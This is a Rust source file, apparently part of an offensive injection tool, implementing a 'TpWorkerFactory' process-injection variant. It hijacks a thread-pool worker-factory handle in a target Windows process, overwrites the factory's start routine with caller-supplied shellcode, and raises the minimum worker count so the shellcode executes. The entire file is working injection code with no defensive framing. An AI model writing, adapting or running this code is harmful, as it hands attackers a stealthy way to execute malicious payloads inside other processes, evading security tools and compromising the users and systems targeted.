use super::Variant;
use crate::{
    utils::hijack_handle,
    winapi::{
        NtQueryInformationWorkerFactory, NtSetInformationWorkerFactory, WORKER_FACTORY_ALL_ACCESS,
        WorkerFactoryBasicInformation,
    },
};
use core::{mem::zeroed, ptr};
use ghostptr::{Handle, MemoryProtection, Process, ProcessError, SafeHandle};

/// Queries a TpWorkerFactory's basic information.
fn get_factory_info(handle: Handle) -> ghostptr::Result<WorkerFactoryBasicInformation> {
    let mut info = unsafe { zeroed::<WorkerFactoryBasicInformation>() };
    let status = unsafe {
        NtQueryInformationWorkerFactory(
            handle,
            0x7, // WorkerFactoryBasicInformation
            (&mut info as *mut WorkerFactoryBasicInformation).cast(),
            size_of::<WorkerFactoryBasicInformation>() as u32,
            ptr::null_mut(),
        )
    };

    if status != 0 {
        Err(ProcessError::NtStatus(status))
    } else {
        Ok(info)
    }
}

/// Increments the TpWorkerFactory's TotalWorkerCount to trigger execution.
fn execute_factory(handle: Handle, info: &WorkerFactoryBasicInformation) -> ghostptr::Result<()> {
    let min_thread_count = info.total_worker_count + 1;

    let status = unsafe {
        NtSetInformationWorkerFactory(
            handle,
            0x4, //  WorkerFactoryThreadMinimum
            (&min_thread_count as *const u32).cast(),
            size_of::<u32>() as u32,
        )
    };

    if status != 0 {
        Err(ProcessError::NtStatus(status))
    } else {
        Ok(())
    }
}

pub struct TpWorkerFactory;

impl Variant for TpWorkerFactory {
    fn run(&self, process: &Process, shellcode: &[u8]) -> ghostptr::Result<()> {
        let factory_handle = SafeHandle::from(
            hijack_handle(process, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)?
                .expect("failed to hijack TpWorkerFactory handle"),
        );

        println!("hijacked handle: {:?}", factory_handle);

        let info = get_factory_info(factory_handle.0)?;
        println!("start routine: {:p}", info.start_routine);

        // write shellcode
        let old_protection = process.protect_mem(
            info.start_routine as usize,
            shellcode.len(),
            MemoryProtection::READWRITE,
        )?;
        process.write_slice(info.start_routine as usize, shellcode)?;
        process.protect_mem(info.start_routine as usize, shellcode.len(), old_protection)?;

        // trigger TpWorkerFactory execution
        execute_factory(factory_handle.0, &info)?;

        Ok(())
    }
}
